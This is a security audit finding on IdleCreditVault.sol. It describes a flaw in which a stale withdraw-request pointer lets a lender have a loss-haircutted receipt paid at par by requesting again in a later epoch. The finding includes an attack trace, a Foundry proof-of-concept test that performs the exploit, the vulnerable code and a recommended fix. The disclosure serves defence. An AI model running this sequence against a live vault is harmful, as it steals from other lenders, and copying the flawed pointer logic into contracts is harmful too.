### Title
Stale `lastWithdrawRequest` lets a user claim a loss-haircutted receipt at par by requesting again in a later epoch — (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault.requestWithdraw` records each receipt both in the aggregate `withdrawsRequests[_user]` and per-epoch in `withdrawsRequestsByEpoch[_user][epoch]`, but keeps only a single pointer, `lastWithdrawRequest[_user]`, to the latest request epoch. Loss-adjusted accounting (`lossRecoveryPriceByEpoch`) is keyed per epoch, yet both the guard in `requestWithdraw` and `_claimLossAdjustedWithdrawRequest` look up the loss price only at `lastWithdrawRequest`. A lender whose epoch-N receipt was haircut by `stopEpochWithDuration(_lossAmount)` can simply submit a second withdrawal request in epoch N+1; the pointer is remapped to N+1, the loss-adjusted path silently skips the epoch-N receipt, and `_claimFundedWithdrawRequest` pays the full aggregate at par — stealing the haircut from remaining vault holders.

### Finding Description
- `requestWithdraw` guard only checks `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` (the *new* last epoch) before overwriting `lastWithdrawRequest[_user] = currentEpoch` [1](#0-0) .
- `_claimLossAdjustedWithdrawRequest` also only reads `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`; if a newer epoch superseded the loss epoch, `lossRecoveryPrice == 0` and it returns early [2](#0-1) .
- `_claimFundedWithdrawRequest` then pays the entire `withdrawsRequests[_user]` (which still contains the epoch-N amount, since `_clearWithdrawClaimForEpoch` was never reached for it) plus APR0 buckets at par via `_transferFundedClaim`, and resets `lastWithdrawRequest` to 0 — permanently burying the loss-epoch receipt [3](#0-2) .
- No guard prevents requesting again before claiming (the code comments explicitly allow it — "he will have to wait for another epoch to claim both requests"), and nothing iterates over older epochs with nonzero `lossRecoveryPriceByEpoch`.

Attack trace (running epoch, fixed-APR mode):
1. Attacker (KYC'd lender) deposits and calls `requestWithdraw` in epoch N → receipt recorded at epoch N.
2. `stopEpochWithDuration` executes with `_lossAmount > 0` → `lossRecoveryPriceByEpoch[N]` set, `epochNumber` increments.
3. Attacker calls `requestWithdraw` again (small amount) in epoch N+1 → guard checks `lossRecoveryPriceByEpoch[N+1] == 0`, passes; `lastWithdrawRequest = N+1`.
4. After epoch N+1 stops and borrower funds `pendingWithdraws`, attacker calls `claimWithdrawRequest` → loss-adjusted path finds nothing at N+1, funded path pays epoch-N + epoch-N+1 receipts at par.

### Impact Explanation
The broken invariant is the loss waterfall / "one receipt one payout at its epoch price": a receipt that should pay `claimBasis * lossRecoveryPrice / RECOVERY_FULL` pays full face value. The excess is drawn from funded vault reserves earmarked for all pending claimants, so the attacker directly steals the socialized loss from other lenders; with a large epoch-N receipt the vault becomes insolvent for remaining claimants. Loss bounded only by the attacker's deposit size.

### Likelihood Explanation
Requires an epoch ending with `stopEpochWithDuration(_lossAmount)` (borrower partial non-repayment — the exact scenario the loss machinery exists for) and the attacker holding a receipt in that epoch plus making one extra request. Any unprivileged lender can do this; no privileged cooperation needed.

### Recommendation
Don't rely on a single `lastWithdrawRequest` pointer for loss accounting. Either iterate the user's `withdrawsRequestsByEpoch` keys for any epoch with nonzero `lossRecoveryPriceByEpoch` (or store a per-user list of request epochs), or in `requestWithdraw` revert whenever `lossRecoveryPriceByEpoch` is nonzero for *any* epoch with a nonzero user receipt — not just `lastWithdrawRequest` — and make `_claimFundedWithdrawRequest` exclude amounts belonging to unclaimed loss epochs (or settle them at the loss price first).

// Foundry fork test against IdleCreditVault / IdleCDOEpochVariant
function testLossReceiptClaimedAtPar() external {
    // --- Epoch N: deposit and request withdraw ---
    uint256 amount = 100_000 * ONE_SCALE;
    idleCDO.depositAA(amount);                       // attacker is a KYC'd lender
    uint256 principal = cdoEpoch.requestWithdraw(
        IERC20(AAtranche).balanceOf(address(this)), address(AAtranche));

    _startEpoch();
    // borrower repays only partially -> manager stops epoch with a loss
    uint256 loss = principal / 2;
    deal(underlying, borrower, cdoEpoch.expectedEpochInterest() + pendingWithdraws - loss);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(loss, epochDuration); // sets lossRecoveryPriceByEpoch[N] < 1

    // --- Epoch N+1: attacker remaps lastWithdrawRequest with a fresh tiny request ---
    idleCDO.depositAA(1 * ONE_SCALE);
    cdoEpoch.requestWithdraw(IERC20(AAtranche).balanceOf(address(this)), address(AAtranche));
    // guard passed: lossRecoveryPriceByEpoch[N+1] == 0

    _startEpoch();
    deal(underlying, borrower, cdoEpoch.expectedEpochInterest() + vault.pendingWithdraws());
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // --- Claim: epoch-N loss receipt paid at par ---
    uint256 balPre = IERC20(underlying).balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = IERC20(underlying).balanceOf(address(this)) - balPre;

    uint256 lossPrice = vault.lossRecoveryPriceByEpoch(epochN);
    // VULNERABILITY: paid == principal + dust receipt (par), not principal * lossPrice / 1e18
    assertGt(paid, principal * lossPrice / 1e18, "loss receipt escaped haircut");
}

  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
  }

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }
